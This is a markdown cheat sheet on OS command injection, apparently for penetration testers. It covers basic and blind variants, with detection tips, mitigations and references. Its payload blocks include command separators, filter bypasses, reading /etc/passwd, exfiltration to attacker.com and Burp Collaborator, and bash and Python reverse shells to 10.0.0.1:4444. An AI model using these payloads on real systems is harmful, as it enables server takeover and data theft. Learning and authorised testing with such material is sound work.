# Command Injection

Operating system command injection occurs when user input is passed unsanitized to a shell
or system command. The attacker executes arbitrary OS commands on the server.

---

## Basic Command Injection

**Category:** RCE
**Severity context:** Critical — full server compromise, lateral movement potential.

### How to identify it
Look for parameters that feed into shell commands: `ping`, `nslookup`, `host`, `traceroute`,
`whois`, `curl`, `wget`, `mail`. Submit a benign command separator (`;`, `&&`, `||`, `` ` ``, `$()`) with a
sleeper command (`sleep 5`) and time the response.

### How it works
The application builds a command string using user input and passes it to a shell (e.g.
`system()`, `exec()`, `shell_exec()`, `Runtime.exec()`, `subprocess.Popen()`). Shell
metacharacters let you break out of the intended command and chain your own.

### Exploitation
```bash
# Command separators
; whoami         # semicolon (most reliable)
| whoami         # pipe — feeds output as input
&& whoami        # AND — runs only if first succeeds
|| whoami        # OR — runs only if first fails
`whoami`         # backtick — command substitution (Bourne shells)
$(whoami)        # dollar-paren — POSIX command substitution

# Blind detection via time delay
; sleep 5
| sleep 5
&& sleep 5
$(sleep 5)

# Out-of-band exfiltration (DNS / HTTP)
; curl http://attacker.com/$(whoami)
| nslookup $(whoami).attacker.com

# Bypass simple filters — no-space payloads
;{ls,-la}        # Brace expansion (Bash)
$(IFS=;ls$IFS-la)  # IFS splitting
;ls$9-la         # $9 is empty on most shells

# URL-encoded newline injection (bypasses some PHP escapeshellarg)
%0a whoami
```
### Example
```
Vulnerable URL:  http://target.com/ping?host=8.8.8.8
Payload:         http://target.com/ping?host=8.8.8.8;cat /etc/passwd
Response:        Returns contents of /etc/passwd after ping output
```

### Mitigation
Avoid shell-calling functions entirely. If unavoidable, use `escapeshellcmd()` /
`escapeshellarg()` (PHP), `shlex.quote()` (Python), or `ProcessBuilder` with a string list
(Java) — never concatenate into a shell string.

### References
- [PortSwigger: OS command injection](https://portswigger.net/web-security/os-command-injection)
- [OWASP: Command Injection](https://owasp.org/www-community/attacks/Command_Injection)

---

## Blind Command Injection (Out-of-Band)

**Category:** RCE (Blind)
**Severity context:** Critical — same impact as basic, but no output rendered in the response.

### How to identify it
You submit commands but see no output difference in the HTTP response. Test with a
time-based delay or an out-of-band channel (DNS lookup, HTTP callback to your listener).

### How it works
The application runs your command but discards or hides the output. You cannot read `stdout`,
so you must either infer execution via side effects (timing, file creation, outbound
connections) or exfiltrate data through a channel you control.

### Exploitation
```bash
# Time-based confirmation
& sleep 5 &
| ping -c 5 127.0.0.1 &

# Out-of-band — DNS exfil (set up tcpdump or Burp Collaborator)
& nslookup $(whoami).burpcollaborator.net &
| curl http://attacker.com/$(hostname) &

# Write output to a web-accessible file
; echo $(whoami) > /var/www/html/out.txt
| ls /home > /var/www/html/users.txt

# Reverse shell (if outbound connectivity)
; bash -c 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'
| python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("10.0.0.1",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

### Mitigation
Same as basic command injection — never pass unsanitized input to shell functions.
Additionally, restrict outbound network egress from the application server.

### References
- [PortSwigger: Blind OS command injection](https://portswigger.net/web-security/os-command-injection/blind)
- [PayloadsAllTheThings: Command Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection)
